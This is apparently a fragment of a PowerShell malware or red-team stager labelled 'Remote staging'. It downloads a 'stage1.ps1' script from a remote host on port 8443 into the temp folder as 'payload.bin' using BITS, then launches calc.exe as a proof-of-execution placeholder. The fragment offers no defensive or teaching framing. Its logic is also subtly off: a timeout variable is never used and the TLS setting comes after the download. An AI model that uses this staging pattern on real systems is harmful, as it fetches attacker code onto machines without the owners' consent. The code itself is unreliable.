
# Remote staging
$Stage1Url = 'https://internal.corp:8443/stage1.ps1'
$OutputPath = "$env:TEMP\payload.bin"
$TimeoutSec = 16
Start-BitsTransfer -Source $Stage1Url -Destination $OutputPath
Start-Process -FilePath "calc.exe"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
